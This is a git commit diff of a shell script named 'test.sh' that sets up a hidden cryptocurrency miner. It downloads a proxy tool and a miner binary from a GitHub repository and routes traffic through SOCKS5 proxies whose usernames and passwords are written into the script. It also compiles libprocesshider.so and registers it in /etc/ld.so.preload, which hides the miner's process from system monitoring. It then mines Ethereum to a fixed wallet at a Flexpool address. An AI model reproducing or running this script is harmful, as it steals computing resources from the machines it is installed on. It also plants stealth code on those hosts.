b1cdce87220dfe69365a428e0ee9a5801467734d
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-04-22 00:46:07 +0700

    Update test.sh

--- test.sh
+++ test.sh
@@ -1,48 +1,26 @@
 #!/bin/sh
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
 dpkg-reconfigure --frontend noninteractive tzdata
-
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
-
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
 tar -xvzf graphics.tar.gz
-
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 154.38.35.250:5518
-socks5_username = lebarankita
-socks5_password = buatTHRan
+socks5 = 104.227.76.30:6127
+socks5_username = sikencot
+socks5_password = mbah2237
 END
-
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo "******************************************************************"
-
 ./graftcp/graftcp curl ifconfig.me
 
-echo " "
-echo " "
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 
-echo "******************************************************************"
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/nvidia
-chmod +x nvidia
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNvidia.zip
-unzip magicNvidia.zip
+chmod +x bezzHash
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./nvidia -a ETHASH --pool eth-us-west.flexpool.io:5555 --tls on --user 0xbc48b8bdce572defe4dcab85103f140099bc5af5 --worker RDP --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
+./graftcp/graftcp ./bezzHash --url=ssl://0xbc48b8bdce572defe4dcab85103f140099bc5af5.RDP@eth-us-west.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
